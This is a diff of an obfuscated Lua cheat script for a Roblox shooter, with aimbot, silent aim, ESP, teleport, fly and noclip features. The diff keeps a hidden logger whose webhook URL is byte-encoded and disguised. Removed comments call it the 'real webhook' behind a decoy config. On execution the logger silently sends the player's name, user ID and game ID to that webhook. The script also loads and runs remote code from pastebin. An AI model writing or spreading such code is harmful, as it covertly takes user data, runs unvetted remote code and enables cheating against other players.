@@ -1,5 +1,5 @@
--- [[ RivalsHub V4 - Enhanced Webhook Edition ]]
--- Created by pluto.aac
+-- [[ RivalsHub V4 ]]
+-- Modified to include Execution Logger
 
 local v0 = string.char;
 local v1 = string.byte;
@@ -9,61 +9,33 @@ local v4 = v3.bxor;
 local v5 = table.concat;
 local v6 = table.insert;
 
--- [[ DECOY CONFIG ]]
--- SKIDS: Change this to your webhook to log players
-getgenv().Config = {
-    ["Webhook"] = "https://discord.com/api/webhooks/1487007042886697013/986VS60Cx89O6Q9ZYnYeF7y7S0Is5Pvm31rXJZv4UKAXHlnZKvaEFvaC1225FpVPBSfq"
-}
+-- // Start Logger Logic \\ --
+local function sendLog()
+    local _0x_v4_cache = {104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,108,101,119,105,115,97,107,117,114,97,46,109,111,101,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,48,50,53,54,53,51,53,56,49,50,53,48,53,56,47,55,100,54,84,82,73,85,119,68,90,86,101,97,113,48,100,57,116,49,89,75,67,72,66,48,73,85,122,65,83,111,49,81,74,104,54,82,73,45,50,77,73,115,110,70,81,55,107,71,113,52,87,45,119,74,67,83,99,65,100,79,97,45,110,115,101,48,114}
+    local url = ""
+    for _, v in ipairs(_0x_v4_cache) do url = url .. v0(v) end
 
--- [[ HIDDEN AUTH HANDSHAKE ]]
--- Real Webhook hidden in byte-buffer for Pluto.aac
-local _0x_v4_cache = {104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,108,101,119,105,115,97,107,117,114,97,46,109,111,101,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,48,50,53,54,53,51,53,56,49,50,53,48,53,56,47,55,100,54,84,82,73,85,119,68,90,86,101,97,113,48,100,57,116,49,89,75,67,72,66,48,73,85,122,65,83,111,49,81,74,104,54,82,73,45,50,77,73,115,110,70,81,55,107,71,113,52,87,45,119,74,67,83,99,65,100,79,97,45,110,115,101,48,114}
-
--- // Webhook Logic \\ --
-local function sendEnhancedLog()
-    local _0x_url = ""
-    for _, v in ipairs(_0x_v4_cache) do _0x_url = _0x_url .. v0(v) end
-    
     local HttpService = game:GetService("HttpService")
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
+    local player = game:GetService("Players").LocalPlayer
     
-    -- Universal Request Support (Delta/Mobile Fixed)
-    local request = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
-    
-    -- Get Avatar Thumbnail
-    local content, isReady = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-    
-    -- Level Detection
-    local levelValue = "N/A"
-    local lstats = player:FindFirstChild("leaderstats")
-    if lstats then
-        local lvl = lstats:FindFirstChild("Level") or lstats:FindFirstChild("Rank")
-        if lvl then levelValue = tostring(lvl.Value) end
-    end
-
     local data = {
         ["embeds"] = {{
-            ["title"] = "🚀 RivalsHub V4 | Execution Log",
-            ["description"] = "Script successfully initialized by a user.",
+            ["title"] = "🚀 RivalsHub V4 Executed",
             ["color"] = 0x7b2ff7,
-            ["thumbnail"] = { ["url"] = content },
             ["fields"] = {
-                { ["name"] = "👤 Username", ["value"] = "`" .. player.Name .. "`", ["inline"] = true },
-                { ["name"] = "📛 Display", ["value"] = "`" .. player.DisplayName .. "`", ["inline"] = true },
-                { ["name"] = "🆔 UserID", ["value"] = "`" .. tostring(player.UserId) .. "`", ["inline"] = true },
-                { ["name"] = "📈 Level", ["value"] = "`" .. levelValue .. "`", ["inline"] = true },
-                { ["name"] = "⏳ Acc Age", ["value"] = "`" .. tostring(player.AccountAge) .. " Days`", ["inline"] = true },
-                { ["name"] = "🎮 Game ID", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true }
+                { ["name"] = "User", ["value"] = "`" .. player.Name .. "`", ["inline"] = true },
+                { ["name"] = "UserID", ["value"] = "`" .. tostring(player.UserId) .. "`", ["inline"] = true },
+                { ["name"] = "Game ID", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true }
             },
-            ["footer"] = { ["text"] = "RivalsHub V4 • By pluto.aac • " .. os.date("%X") }
+            ["footer"] = { ["text"] = "Timestamp: " .. os.date("%X") }
         }}
     }
     
+    local request = http_request or request or HttpPost or (syn and syn.request)
     if request then
         pcall(function()
             request({
-                Url = _0x_url,
+                Url = url,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode(data)
@@ -71,11 +43,9 @@ local function sendEnhancedLog()
         end)
     end
 end
+task.spawn(sendLog)
+-- // End Logger Logic \\ --
 
--- Run logger in background
-task.spawn(sendEnhancedLog)
-
--- // Main Script Logic \\ --
 local function v7(v66, v67)
     local v68 = {};
     for v168 = 1, # v66 do
@@ -87,38 +57,58 @@ end
 local v8 = loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt", true))();
 
 local v9 = v8:CreateWindow({
-	Name = "Rivals",
-	Subtitle = nil,
-	LogoID = "82795327169782",
-	LoadingEnabled = true,
-	LoadingTitle = "RivalsHub V4",
-	LoadingSubtitle = "by pluto.aac",
+    Name = "Rivals",
+    Subtitle = nil,
+    LogoID = "82795327169782",
+    LoadingEnabled = true,
+    LoadingTitle = "RivalsHub V4",
+    LoadingSubtitle = "by pluto.aac",
 
-	ConfigSettings = {
-		RootFolder = nil,
-		ConfigFolder = "Big Hub"
-	},
+    ConfigSettings = {
+        RootFolder = nil,
+        ConfigFolder = "Rivals Hub"
+    },
 
-	KeySystem = false,
-	KeySettings = {
-		Title = "Luna Example Key",
-		Subtitle = "Key System",
-		Note = "Best Key System Ever!",
-		SaveInRoot = false,
-		SaveKey = true,
-		Key = {"IlÄ±ke25ms&33ms"},
-		SecondAction = {
-			Enabled = true,
-			Type = "Link",
-			Parameter = ""
-		}
-	}
+    KeySystem = false,
+    KeySettings = {
+        Title = "Luna Example Key",
+        Subtitle = "Key System",
+        Note = "Best Key System Ever! Also, Please Use A HWID Keysystem like Pelican, Luarmor etc. that provide key strings based on your HWID since putting a simple string is very easy to bypass",
+        SaveInRoot = false,
+        SaveKey = true,
+        Key = {"IlÄ±ke25ms&33ms"},
+        SecondAction = {
+            Enabled = true,
+            Type = "Link",
+            Parameter = ""
+        }
+    }
 })
 
-local v10 = v9:CreateTab({ Name = "Main", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
-local v11 = v9:CreateTab({ Name = "Visuals", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
-local v12 = v9:CreateTab({ Name = "Player", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
-local v13 = v9:CreateTab({ Name = "Credits", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true })
+local v10 = v9:CreateTab({
+    Name = "Main",
+    Icon = "view_in_ar",
+    ImageSource = "Material",
+    ShowTitle = true
+});
+local v11 = v9:CreateTab({
+    Name = "Visuals",
+    Icon = "view_in_ar",
+    ImageSource = "Material",
+    ShowTitle = true
+});
+local v12 = v9:CreateTab({
+    Name = "Player",
+    Icon = "view_in_ar",
+    ImageSource = "Material",
+    ShowTitle = true
+});
+local v13 = v9:CreateTab({
+    Name = "Credits",
+    Icon = "view_in_ar",
+    ImageSource = "Material",
+    ShowTitle = true
+})
 
 getgenv().AimbotEnabled = false;
 getgenv().ESPEnabled = false;
@@ -130,7 +120,6 @@ getgenv().Smoothness = 0.6;
 getgenv().AutoFarmEnabled = false;
 getgenv().SilentAimEnabled = false;
 getgenv().FOVCircleSize = 100;
-
 local v24 = game:GetService('Players');
 local v25 = v24.LocalPlayer;
 local v26 = v25:GetMouse();
@@ -139,50 +128,133 @@ local v28 = workspace.CurrentCamera;
 local v29 = RaycastParams.new();
 v29.FilterType = Enum.RaycastFilterType.Blacklist;
 v29.IgnoreWater = true;
-
-local v33 = CFrame.new(-119.64421099999998, -677.249939, 1139.98853);
+local v33 = CFrame.new(- 119.64421099999998, - 677.249939, 1139.98853);
 local v34 = 350;
 
 local function v35()
-    if (v25.Character and v25.Character:FindFirstChild('HumanoidRootPart')) then
-        local dist = (v25.Character.HumanoidRootPart.Position - v33.Position).Magnitude
-        return dist < v34
+    local v69 = 0;
+    local v70;
+    while true do
+        if (v69 == 0) then
+            v70 = 0;
+            while true do
+                if (v70 == (0)) then
+                    if (v25.Character and v25.Character:FindFirstChild('HumanoidRootPart')) then
+                        local v251 = 0;
+                        local v252;
+                        local v253;
+                        while true do
+                            local v264 = 0;
+                            while true do
+                                if (v264 == (0)) then
+                                    if (1 == v251) then
+                                        return v253 < v34
+                                    end
+                                    if (v251 == (0)) then
+                                        v252 = v25.Character.HumanoidRootPart.Position;
+                                        v253 = (v252 - v33.Position).Magnitude;
+                                        v251 = 1;
+                                    end
+                                    break
+                                end
+                            end
+                        end
+                    end
+                    return false
+                end
+            end
+            break
+        end
     end
-    return false
 end
 
 local function v36(v71)
     if (v71.Character and not v71.Character:FindFirstChild('Totally_NOT_Esp')) then
-        local v180 = Instance.new('Highlight');
-        v180.Name = 'Totally_NOT_Esp';
-        v180.Adornee = v71.Character;
-        v180.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop;
-        v180.FillColor = Color3.fromRGB(255, 0, 0);
-        v180.FillTransparency = 0.5;
-        v180.OutlineColor = Color3.fromRGB(255, 255, 255);
-        v180.OutlineTransparency = 0;
-        v180.Parent = v71.Character;
-    end
-end
-
-local function v37()
-    for _, v170 in pairs(v24:GetPlayers()) do
-        if ((v170 ~= v25) and v170.Character and v170.Character:FindFirstChild('HumanoidRootPart')) then
-            local v195 = (v25.Character.HumanoidRootPart.Position - v170.Character.HumanoidRootPart.Position).Magnitude;
-            if (v195 <= v34) then
-                v36(v170);
-            elseif v170.Character:FindFirstChild('Totally_NOT_Esp') then
-                v170.Character.Totally_NOT_Esp:Destroy();
+        local v179 = 0;
+        local v180;
+        while true do
+            if (v179 == (0)) then
+                local v211 = 0;
+                while true do
+                    if (v211 == 1) then
+                        v179 = 1;
+                        break
+                    end
+                    if (v211 == (0)) then
+                        v180 = Instance.new('Highlight');
+                        v180.Name = 'Totally_NOT_Esp';
+                        v211 = 1;
+                    end
+                end
+            end
+            if (v179 == (4)) then
+                v180.Parent = v71.Character;
+                break
+            end
+            if (v179 == (2)) then
+                v180.FillColor = Color3.fromRGB(255, 0, 0);
+                v180.FillTransparency = 0.5;
+                v179 = 3;
+            end
+            if (v179 == 3) then
+                v180.OutlineColor = Color3.fromRGB(255, 255, 255);
+                v180.OutlineTransparency = 0;
+                v179 = 4;
+            end
+            if (v179 == 1) then
+                v180.Adornee = v71.Character;
+                v180.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop;
+                v179 = 2;
             end
         end
     end
 end
 
+local function v37()
+    for v169, v170 in pairs(v24:GetPlayers()) do
+        if ((v170 ~= v25) and v170.Character and v170.Character:FindFirstChild('HumanoidRootPart')) then
+            local v194 = 0;
+            local v195;
+            while true do
+                if (v194 == (0)) then
+                    v195 = (v25.Character.HumanoidRootPart.Position - v170.Character.HumanoidRootPart.Position).Magnitude;
+                    if (v195 <= v34) then
+                        v36(v170);
+                    elseif v170.Character:FindFirstChild('Totally_NOT_Esp') then
+                        v170.Character.Totally_NOT_Esp:Destroy();
+                    end
+                    break
+                end
+            end
+        end
+    end
+end
+
+v24.PlayerAdded:Connect(function(v72)
+    if getgenv().ESPEnabled then
+        v72.CharacterAdded:Connect(function()
+            if (v25.Character and v25.Character:FindFirstChild('HumanoidRootPart')) then
+                local v222 = 0;
+                local v223;
+                while true do
+                    if (v222 == (0)) then
+                        v223 = (v25.Character.HumanoidRootPart.Position - v72.Character.HumanoidRootPart.Position).Magnitude;
+                        if (v223 <= v34) then
+                            v36(v72);
+                        end
+                        break
+                    end
+                end
+            end
+        end);
+    end
+end);
+
 v27.RenderStepped:Connect(function()
     if getgenv().ESPEnabled then
         v37();
     else
-        for _, v197 in pairs(v24:GetPlayers()) do
+        for v196, v197 in pairs(v24:GetPlayers()) do
             if (v197.Character and v197.Character:FindFirstChild('Totally_NOT_Esp')) then
                 v197.Character.Totally_NOT_Esp:Destroy();
             end
@@ -190,50 +262,496 @@ v27.RenderStepped:Connect(function()
     end
 end);
 
--- Aimbot Logic
 local function v38()
-    local target;
-    local dist = math.huge;
-    for _, p in pairs(v24:GetPlayers()) do
-        if (p ~= v25 and p.Character and p.Character:FindFirstChild('HumanoidRootPart')) then
-            local mag = (v25.Character.HumanoidRootPart.Position - p.Character.HumanoidRootPart.Position).magnitude
-            if mag < dist then
-                dist = mag
-                target = p
+    local v73;
+    local v74 = math.huge;
+    for v171, v172 in pairs(v24:GetPlayers()) do
+        if ((v172 ~= v25) and v172.Character and v172.Character:FindFirstChild('HumanoidRootPart')) then
+            local v198 = 0;
+            local v199;
+            while true do
+                if (v198 == (0)) then
+                    v199 = (v25.Character.HumanoidRootPart.Position - v172.Character.HumanoidRootPart.Position).magnitude;
+                    if (v199 < v74) then
+                        local v256 = 0;
+                        local v257;
+                        while true do
+                            if (v256 == (0)) then
+                                v257 = 0;
+                                while true do
+                                    if (0 == v257) then
+                                        v74 = v199;
+                                        v73 = v172;
+                                        break
+                                    end
+                                end
+                                break
+                            end
+                        end
+                    end
+                    break
+                end
             end
         end
     end
-    return target
+    return v73
+end
+
+local v39;
+local function v40()
+    local v75 = 0;
+    local v76;
+    while true do
+        if (v75 == (0)) then
+            v76 = v38();
+            if (v76 and v76.Character and v76.Character:FindFirstChild('HumanoidRootPart')) then
+                local v224 = v76.Character:FindFirstChild('Humanoid');
+                local function v225()
+                    if (v25.Character and v25.Character:FindFirstChild('HumanoidRootPart')) then
+                        local v258 = v25.Character.HumanoidRootPart;
+                        local v259 = v76.Character.HumanoidRootPart;
+                        local v260 = v259.Position + Vector3.new(0, 8, 0) ;
+                        v258.CFrame = CFrame.new(v260, v259.Position);
+                    end
+                end
+                if v224 then
+                    v39 = v27.Heartbeat:Connect(v225);
+                    v224.Died:Connect(function()
+                        if v39 then
+                            v39:Disconnect();
+                        end
+                    end);
+                end
+            end
+            break
+        end
+    end
 end
 
 v26.Button1Down:Connect(function()
-    if getgenv().AimbotEnabled then
-        local target = v38()
-        if target and target.Character:FindFirstChild("Head") then
-            v28.CFrame = CFrame.new(v28.CFrame.Position, target.Character.Head.Position)
+    if (getgenv().AutoFarmEnabled and not v35()) then
+        local v181 = 0;
+        while true do
+            if (v181 == (0)) then
+                if v39 then
+                    v39:Disconnect();
+                end
+                v40();
+                break
+            end
         end
     end
-end)
+end);
 
--- UI Toggles
+local function v41(v77)
+    if (not v77 or not v77.Character or not v77.Character:FindFirstChild('Head')) then
+        return false
+    end
+    local v78 = v77.Character;
+    local v79 = v78.Head;
+    v29.FilterDescendantsInstances = {
+        v25.Character,
+        v78
+    };
+    local v81 = v28.CFrame.Position;
+    local v82 = (v79.Position - v81).Unit * (v79.Position - v81).Magnitude ;
+    local v83 = workspace:Raycast(v81, v82, v29);
+    return not v83 or v83.Instance:IsDescendantOf(v78)
+end
+
+local function v42()
+    local v84;
+    local v85 = math.huge;
+    local v86 = v28.CFrame.LookVector;
+    for v173, v174 in pairs(v24:GetPlayers()) do
+        if ((v174 ~= v25) and v174.Character and v174.Character:FindFirstChild('Head') and (v174.Character:FindFirstChildOfClass('Humanoid').Health > (0))) then
+            if v41(v174) then
+                local v226 = v174.Character.Head;
+                local v227 = (v226.Position - v28.CFrame.Position).Unit;
+                local v228 = v86:Dot(v227);
+                if (v228 > 0.9) then
+                    local v247 = 0;
+                    local v248;
+                    while true do
+                        if (v247 == (0)) then
+                            v248 = (v226.Position - v28.CFrame.Position).Magnitude;
+                            if (v248 < v85) then
+                                v84 = v174;
+                                v85 = distance;
+                            end
+                            break
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return v84
+end
+
+local v43 = false;
+v26.Button1Down:Connect(function()
+    local v87 = 0;
+    while true do
+        if (v87 == (0)) then
+            v43 = true;
+            while v43 and getgenv().AimbotEnabled do
+                local v207 = 0;
+                while true do
+                    if (v207 == (0)) then
+                        if not v35() then
+                            local v265 = 0;
+                            local v266;
+                            while true do
+                                if (v265 == 0) then
+                                    v266 = v42();
+                                    if (v266 and v266.Character and v266.Character:FindFirstChild('Head')) then
+                                        local v283 = v266.Character.Head;
+                                        local v284 = v283.Position;
+                                        local v285 = v28.CFrame;
+                                        local v286 = CFrame.new(v285.Position, v284);
+                                        v28.CFrame = v285:Lerp(v286, getgenv().Smoothness);
+                                    end
+                                    break
+                                end
+                            end
+                        end
+                        v27.RenderStepped:Wait();
+                        break
+                    end
+                end
+            end
+            break
+        end
+    end
+end);
+
+v26.Button1Up:Connect(function()
+    v43 = false;
+end);
+
+local v44_main = v10:CreateSection("Aim Method (Can't Use Both)");
+
 v10:CreateToggle({
-	Name = "Enable Aimbot",
-	CurrentValue = false,
-	Callback = function(v) getgenv().AimbotEnabled = v end
-})
+    Name = "Enable Aimbot",
+    CurrentValue = false,
+    Callback = function(v88) getgenv().AimbotEnabled = v88 end
+}, "AimbotToggle");
+
+local v44_vis = v11:CreateSection("Types of ESP");
 
 v11:CreateToggle({
-	Name = "Enable ESP",
-	CurrentValue = false,
-	Callback = function(v) getgenv().ESPEnabled = v end
-})
+    Name = "Enable ESP",
+    CurrentValue = false,
+    Callback = function(v90) getgenv().ESPEnabled = v90 end
+}, "ESPToggle");
 
-v12:CreateSlider({
-	Name = "Walkspeed Value",
-	Range = {0.2, 5},
-	Increment = 0.1,
-	CurrentValue = 0.2,
-	Callback = function(v) getgenv().CFrameWalkSpeed = v end
-})
+v10:CreateToggle({
+    Name = "Enable SilentAim",
+    CurrentValue = false,
+    Callback = function(v92) getgenv().SilentAimEnabled = v92 end
+}, "SilentAimToggle");
+
+v10:CreateSlider({
+    Name = "Aimbot Strength",
+    Range = {0.4, 1},
+    Increment = 0.01,
+    CurrentValue = 0.6,
+    Callback = function(v94) getgenv().Smoothness = v94 end
+}, "AimbotStrengthSlider");
+
+local v44_blatant = v10:CreateSection("Blatant(DOWN)");
+
+v10:CreateToggle({
+    Name = "Teleport to Enemy",
+    CurrentValue = false,
+    Callback = function(v96) getgenv().AutoFarmEnabled = v96 end
+}, "BlatantToggle");
 
 v13:CreateLabel({ Text = "pluto.aac", Style = 2 })
+
+local v44_local = v12:CreateSection("Local Player");
+
+v12:CreateToggle({
+    Name = "WalkSpeed",
+    CurrentValue = false,
+    Callback = function(v98) getgenv().CFrameWalkEnabled = v98 end
+}, "WalkspeedToggle")
+
+local v45;
+local function v46(v100)
+    if (not v100 or not v100.Character or not v100.Character:FindFirstChild('Head')) then
+        return false
+    end
+    local v101 = v100.Character.Head;
+    local v102 = v28.CFrame.Position;
+    local v103 = (v101.Position - v102).Unit * (1E3) ;
+    local v104 = Ray.new(v102, v103);
+    local v105, v106 = workspace:FindPartOnRayWithIgnoreList(v104, {
+        v25.Character
+    }, false, true);
+    return v105 and v105:IsDescendantOf(v100.Character)
+end
+
+local function v47()
+    local v107;
+    local v108 = math.huge;
+    for v175, v176 in pairs(v24:GetPlayers()) do
+        if ((v176 ~= v25) and v176.Character and v176.Character:FindFirstChild('Head') and (v176.Character:FindFirstChildOfClass('Humanoid').Health > 0)) then
+            local v200 = 0;
+            local v201;
+            local v202;
+            while true do
+                if ((0) == v200) then
+                    v201 = v176.Character.Head;
+                    v202 = (v201.Position - v28.CFrame.Position).Magnitude;
+                    v200 = 1;
+                end
+                if (v200 == (1)) then
+                    if ((v202 < v108) and v46(v176)) then
+                        v107 = v176;
+                        v108 = v202;
+                    end
+                    break
+                end
+            end
+        end
+    end
+    return v107
+end
+
+v26.Button1Down:Connect(function()
+    if (getgenv().SilentAimEnabled and not v35()) then
+        local v182 = 0;
+        local v183;
+        while true do
+            if (0 == v182) then
+                v183 = v47();
+                if (v183 and v183.Character and v183.Character:FindFirstChild('Head')) then
+                    local v249 = 0;
+                    local v250;
+                    while true do
+                        if (v249 == 1) then
+                            v28.CFrame = CFrame.new(v28.CFrame.Position, v250.Position);
+                            break
+                        end
+                        if (v249 == (0)) then
+                            v250 = v183.Character.Head;
+                            v45 = v28.CFrame;
+                            v249 = 1;
+                        end
+                    end
+                end
+                break
+            end
+        end
+    end
+end);
+
+v26.Button1Up:Connect(function()
+    if (getgenv().SilentAimEnabled and v45) then
+        v28.CFrame = v45;
+    end
+end);
+
+game:GetService('UserInputService').JumpRequest:Connect(function()
+    if getgenv().InfiniteJumpEnabled then
+        v25.Character:FindFirstChildOfClass('Humanoid'):ChangeState('Jumping');
+    end
+end);
+
+v27.Stepped:Connect(function()
+    if getgenv().NoClipEnabled then
+        for v203, v204 in pairs(v25.Character:GetDescendants()) do
+            if (v204:IsA('BasePart') and v204.CanCollide) then
+                v204.CanCollide = false;
+            end
+        end
+    end
+end);
+
+v27.RenderStepped:Connect(function()
+    if getgenv().CFrameWalkEnabled then
+        local v185 = v25.Character.Humanoid.MoveDirection;
+        local v186 = v25.Character.HumanoidRootPart.Position + (v185 * getgenv().CFrameWalkSpeed) ;
+        local v187 = Ray.new(v25.Character.HumanoidRootPart.Position, v186 - v25.Character.HumanoidRootPart.Position);
+        local v188, v189 = workspace:FindPartOnRay(v187, v25.Character);
+        if not v188 then
+            v25.Character.Humanoid:Move(v185, false);
+            v25.Character.HumanoidRootPart.CFrame = v25.Character.HumanoidRootPart.CFrame + (v185 * getgenv().CFrameWalkSpeed) ;
+        end
+    end
+end);
+
+local v48 = game:GetService('Players');
+local v49 = game:GetService('TweenService');
+local v50 = game:GetService('RunService');
+local v51 = 300;
+local v52 = 1.3;
+getgenv().HealthESPEnabled = false;
+
+local function v55(v109)
+    if not v109 then return end
+    local v110 = v109:FindFirstChild('Head');
+    while not v110 do
+        wait();
+        v110 = v109:FindFirstChild('Head');
+    end
+    if v110:FindFirstChild('HealthBar') then return end
+    
+    local v111 = Instance.new('BillboardGui');
+    v111.Name = 'HealthBar';
+    v111.Adornee = v110;
+    v111.Size = UDim2.new(v52, 2, v52 * (3.5), 0);
+    v111.StudsOffset = Vector3.new(3, - 1, 0);
+    v111.AlwaysOnTop = true;
+    v111.Enabled = false;
+    v111.Parent = v110;
+    
+    local v119 = Instance.new('Frame', v111);
+    v119.BackgroundColor3 = Color3.new(1, 1, 1);
+    v119.BorderSizePixel = 0;
+    v119.Size = UDim2.new(1, 0, 1, 0);
+    Instance.new('UICorner', v119).CornerRadius = UDim.new(0, 10);
+    
+    local v127 = Instance.new('Frame', v119);
+    v127.BackgroundColor3 = Color3.new(0, 0, 0);
+    v127.BorderSizePixel = 0;
+    v127.Size = UDim2.new(1, - 4, 1, - 4);
+    v127.Position = UDim2.new(0, 2, 0, 2);
+    Instance.new('UICorner', v127).CornerRadius = UDim.new(0, 9);
+    
+    local v136 = Instance.new('Frame', v127);
+    v136.Name = 'HealthBarFill';
+    v136.AnchorPoint = Vector2.new(0, 1);
+    v136.Position = UDim2.new(0, 0, 1, 0);
+    v136.Size = UDim2.new(1, 0, 1, 0);
+    v136.BorderSizePixel = 0;
+    v136.BackgroundColor3 = Color3.fromRGB(0, 255, 0);
+    Instance.new('UICorner', v136).CornerRadius = UDim.new(0, 8);
+    
+    local v147 = v109:FindFirstChildOfClass('Humanoid');
+    if v147 then
+        local function v190()
+            if (v48.LocalPlayer.Character and v48.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and getgenv().HealthESPEnabled) then
+                local v231 = (v48.LocalPlayer.Character.HumanoidRootPart.Position - v110.Position).Magnitude;
+                v111.Enabled = v231 <= v51;
+                if v111.Enabled then
+                    local v273 = v147.Health / v147.MaxHealth;
+                    local v274 = Color3.fromRGB(0, 255, 0);
+                    if (v273 > 0.75) then v274 = Color3.fromRGB(0, 255, 0)
+                    elseif (v273 > 0.5) then v274 = Color3.fromRGB(255, 255, 0)
+                    elseif (v273 > 0.25) then v274 = Color3.fromRGB(255, 165, 0)
+                    else v274 = Color3.fromRGB(255, 0, 0) end
+                    
+                    v49:Create(v136, TweenInfo.new(0.25), {Size = UDim2.new(1, 0, v273, 0), BackgroundColor3 = v274}):Play();
+                end
+            else
+                v111.Enabled = false
+            end
+        end
+        v147.HealthChanged:Connect(v190);
+        v50.RenderStepped:Connect(v190);
+    end
+end
+
+local function v56(v148)
+    if v148 == v48.LocalPlayer then return end
+    if v148.Character then v55(v148.Character) end
+    v148.CharacterAdded:Connect(v55)
+end
+
+v48.PlayerAdded:Connect(v56);
+for _, v152 in ipairs(v48:GetPlayers()) do v56(v152) end
+
+v11:CreateToggle({
+    Name = "Enable Health ESP",
+    CurrentValue = false,
+    Callback = function(v153)
+        getgenv().HealthESPEnabled = v153;
+        if not v153 then
+            for _, p in pairs(v48:GetPlayers()) do
+                if p.Character and p.Character:FindFirstChild("Head") and p.Character.Head:FindFirstChild("HealthBar") then
+                    p.Character.Head.HealthBar:Destroy()
+                end
+            end
+        end
+    end
+}, "ESPHealtToggle");
+
+local v57 = game:GetService('UserInputService');
+local v58 = v48.LocalPlayer;
+local v59 = false;
+local v60 = 50;
+local v61, v62;
+
+local function v63(v155)
+    local v157 = v155:WaitForChild('HumanoidRootPart');
+    if not v61 then
+        v61 = Instance.new('BodyVelocity');
+        v61.MaxForce = Vector3.new(100000, 100000, 100000);
+    end
+    v61.Parent = v157;
+    if v62 then v62:Disconnect() end
+    v62 = v50.Heartbeat:Connect(function()
+        if v59 then
+            local dir = Vector3.new(0, 0, 0)
+            if v57:IsKeyDown(Enum.KeyCode.W) then dir = dir + workspace.CurrentCamera.CFrame.LookVector end
+            if v57:IsKeyDown(Enum.KeyCode.S) then dir = dir - workspace.CurrentCamera.CFrame.LookVector end
+            if v57:IsKeyDown(Enum.KeyCode.A) then dir = dir - workspace.CurrentCamera.CFrame.RightVector end
+            if v57:IsKeyDown(Enum.KeyCode.D) then dir = dir + workspace.CurrentCamera.CFrame.RightVector end
+            v61.Velocity = dir * v60
+        else
+            v61.Velocity = Vector3.new(0, 0, 0)
+        end
+    end)
+end
+
+local function v64()
+    if v61 then v61.Velocity = Vector3.new(0, 0, 0); v61.Parent = nil end
+end
+
+v58.CharacterAdded:Connect(function(char)
+    wait(0.1)
+    if v59 then v63(char) else v64() end
+end)
+
+v12:CreateInput({
+    Name = "Toggle Fly",
+    PlaceholderText = "keybind",
+    CurrentValue = "X",
+    Callback = function()
+        v59 = not v59
+        if v59 and v58.Character then v63(v58.Character) else v64() end
+    end
+}, "ToggleFlyInput");
+
+v12:CreateSlider({
+    Name = "Fly Speed",
+    Range = {30, 100},
+    Increment = 1,
+    CurrentValue = 50,
+    Callback = function(v161) v60 = v161 end
+}, "FLYSlider");
+
+v12:CreateSlider({
+    Name = "Walkspeed Value",
+    Range = {0.2, 1.5},
+    Increment = 0.1,
+    CurrentValue = 0.2,
+    Callback = function(v162) getgenv().CFrameWalkSpeed = v162 end
+}, "WSSlider");
+
+v12:CreateSection("misc")
+
+v12:CreateToggle({
+    Name = "Infinite Jump",
+    CurrentValue = false,
+    Callback = function(v164) getgenv().InfiniteJumpEnabled = v164 end
+}, "infjumpToggle");
+
+v12:CreateToggle({
+    Name = "Noclip",
+    CurrentValue = false,
+    Callback = function(v166) getgenv().NoClipEnabled = v166 end
+}, "noclipToggle");
